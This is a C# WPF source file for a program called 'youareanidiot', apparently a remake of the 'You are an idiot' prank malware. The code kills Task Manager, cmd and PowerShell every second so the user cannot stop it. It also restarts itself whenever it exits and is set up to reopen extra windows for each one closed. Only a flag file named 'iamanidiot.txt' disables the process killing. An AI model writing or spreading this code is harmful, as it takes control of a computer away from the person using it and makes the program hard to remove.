
using System.Diagnostics;
using System.IO;
using System.Windows;

namespace youareanidiot;

/// <summary>
/// Interaction logic for App.xaml
/// </summary>
public partial class App : Application
{
    private const string FlagsFile = "iamanidiot.txt";
    private static string[] GetFlags()
    {
        return !File.Exists(FlagsFile) ? [] : File.ReadAllLines(FlagsFile);
    }
    private const string ALLOW_FORCEFUL_KILL_FLAG = "allow-forceful-kill";

    public const bool DoResurrectWindows = true;
    public const int ResurrectedWindowsPerOneDead = 2;

    // On start:
    /*
     * If this is the main process, start a helper process from the same executable;
     * if this is the helper process, watch the main process and resurrect it when killed.
     */
    protected override void OnStartup(StartupEventArgs e)
    {
        base.OnStartup(e);

        var mainWindow = new MainWindow();
        mainWindow.Show();

        _ = RunProcessKillerAsync();
    }

    private async Task RunProcessKillerAsync()
    {
        while (true)
        {
            KillProcessManagers();
            await Task.Delay(1000);
        }
    }
    private static void KillProcessManagers()
    {
        var targetProcessNames = new[] { "Taskmgr", "Cmd", "Powershell" };

        var candidateProcesses = new List<Process>();
        foreach (var targetProcessName in targetProcessNames) 
        { candidateProcesses.AddRange(Process.GetProcessesByName(targetProcessName)); }

        if (candidateProcesses.Count > 0)
        {
            if (GetFlags().Contains(ALLOW_FORCEFUL_KILL_FLAG))
            {
                Console.WriteLine("Found candidate processes but forceful kill is allowed!");
                return;
            }

            Console.WriteLine($"Found {candidateProcesses.Count} candidate process(es)! Kill them before they kill us.");
        }

        foreach (var candidateProcess in candidateProcesses)
        {
            try
            {
                candidateProcess.Kill();
                Console.WriteLine($"Killed process \"{candidateProcess.ProcessName}\"");
            }
            catch (Exception e)
            { Console.WriteLine($"Could not kill process \"{candidateProcess.ProcessName}\" ({candidateProcess.Id}): {e}"); }
        }
    }

    // On graceful exit, just restart
    protected override void OnExit(ExitEventArgs e)
    {
        base.OnExit(e);

        Process.Start(Environment.ProcessPath!);
    }
}